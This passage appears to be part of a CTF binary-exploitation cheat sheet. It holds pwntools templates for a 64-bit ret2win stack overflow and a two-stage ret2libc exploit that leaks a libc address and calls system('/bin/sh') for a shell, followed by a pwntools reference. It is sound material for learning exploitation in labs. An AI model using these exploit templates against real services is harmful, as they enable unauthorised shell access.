2.3 Ret2Win Template (64-bit)

from pwn import *
elf = context.binary = ELF('./challenge')
p = process('./challenge')  # or remote('IP', PORT)

offset = 72                # Found via cyclic
ret = 0x40101a              # 'ret' gadget for stack alignment
win = elf.symbols['win']    # or hardcoded address

payload = flat({ offset: [ret, win] })
p.sendline(payload)
p.interactive()

2.4 Ret2Libc (Leak + Shell)

from pwn import *
elf = context.binary = ELF('./challenge')
libc = ELF('./libc.so.6')
p = process('./challenge')
rop = ROP(elf)

POP_RDI = rop.find_gadget(['pop rdi', 'ret'])[0]
RET     = rop.find_gadget(['ret'])[0]
offset  = 72

# STAGE 1: Leak puts address
pay1 = flat({ offset: [POP_RDI, elf.got['puts'], elf.plt['puts'], elf.symbols['main']] })
p.sendline(pay1)
leaked = u64(p.recv(6).ljust(8, b'\x00'))
libc.address = leaked - libc.symbols['puts']

# STAGE 2: system('/bin/sh')
pay2 = flat({ offset: [RET, POP_RDI, next(libc.search(b'/bin/sh')), libc.symbols['system']] })
p.sendline(pay2)
p.interactive()

9. PWNTOOLS CHEATSHEET

from pwn import *
context.binary = ELF('./binary')     # Set architecture automatically
p = process('./binary')              # Local
p = remote('ip', port)               # Remote

p.sendline(b"data")                  # Send with newline
p.send(b"data")                      # Send without newline
p.recvuntil(b"prompt: ")             # Wait for prompt
p.recvline()                         # Receive one line
p.interactive()                      # Drop to interactive shell

p32(0xdeadbeef)                      # Pack 32-bit little-endian
p64(0xdeadbeef)                      # Pack 64-bit little-endian
u32(data)                            # Unpack 32-bit
u64(data.ljust(8, b'\x00'))          # Unpack 64-bit (pad to 8 bytes)

flat({ 72: [ret, win] })             # Build payload with offset
